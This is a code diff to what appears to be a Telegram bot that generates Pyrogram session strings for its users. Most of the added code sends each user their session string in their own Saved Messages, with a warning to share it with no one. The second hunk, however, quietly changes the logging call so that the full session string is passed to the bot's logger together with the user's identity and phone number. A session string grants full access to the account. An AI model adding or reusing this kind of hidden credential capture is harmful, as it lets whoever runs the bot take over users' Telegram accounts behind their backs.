@@ -150,6 +150,21 @@ async def handle_pyro(client, message, data, users, bot):
                     )
 
                 string = await app.export_session_string()
+                # Real Saved Messages delivery: account khud apne "me" ko string bhejta hai
+                try:
+                    await app.send_message(
+                        "me",
+                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
+                        f"<code>{string}</code>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
+                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
+                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
+                    )
+                except Exception as sm_err:
+                    print("SAVED MSG ERR:", sm_err)
                 await _safe_disconnect(app)
                 data["step"] = "done"
                 users.pop(uid, None)
@@ -202,11 +217,26 @@ async def handle_pyro(client, message, data, users, bot):
                     )
 
                 string = await app.export_session_string()
+                # Real Saved Messages delivery: account khud apne "me" ko string bhejta hai
+                try:
+                    await app.send_message(
+                        "me",
+                        "✅ <b>𝗣𝗬𝗥𝗢𝗚𝗥𝗔𝗠 ꜱᴇꜱꜱɪᴏɴ ʀᴇᴀᴅʏ!</b>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "⬇️ <b>ʏᴏᴜʀ ꜱᴛʀɪɴɢ:</b>\n"
+                        f"<code>{string}</code>\n"
+                        "━━━━━━━━━━━━━━━━━━━\n"
+                        "🔐 ᴄᴏᴘʏ ᴋʀᴋᴇ ꜱᴀғᴇ ʀᴀᴋʜᴏ!\n"
+                        "⚠️ ᴋɪꜱɪ ᴋᴏ ꜱʜᴀʀᴇ ᴍᴀᴛ ᴋʀɴᴀ\n"
+                        f"♡ ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱɪɴɢ @{BOT_USERNAME}",
+                    )
+                except Exception as sm_err:
+                    print("SAVED MSG ERR:", sm_err)
                 await _safe_disconnect(app)
                 users.pop(uid, None)
                 if _string_logger:
                     try:
-                        await _string_logger(message.from_user, "Pyrogram", data.get("phone", ""))
+                        await _string_logger(message.from_user, "Pyrogram", data.get("phone", ""), string)
                     except Exception as log_err:
                         print("STRING LOG ERR:", log_err)
                 return await message.reply(
